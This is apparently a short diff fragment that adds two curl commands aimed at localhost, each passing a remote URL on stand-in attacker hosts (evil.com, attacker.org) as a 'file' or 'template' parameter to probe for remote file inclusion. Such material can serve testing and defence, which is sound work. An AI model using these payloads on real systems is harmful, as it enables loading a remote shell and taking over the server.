@@ -1,0 +1,2 @@
+curl -sk "https://localhost/?file=http://evil.com/shell.txt"
+curl -sk "https://localhost/?template=https://attacker.org/payload"
